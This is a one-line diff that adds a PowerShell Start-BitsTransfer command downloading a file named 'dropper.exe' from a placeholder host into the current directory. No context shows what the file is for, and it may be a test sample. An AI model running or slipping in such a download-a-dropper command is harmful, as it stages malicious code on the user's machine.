@@ -1,0 +1,1 @@
+Start-BitsTransfer -Source 'http://gz2-example.test/dropper.exe' -Dest .
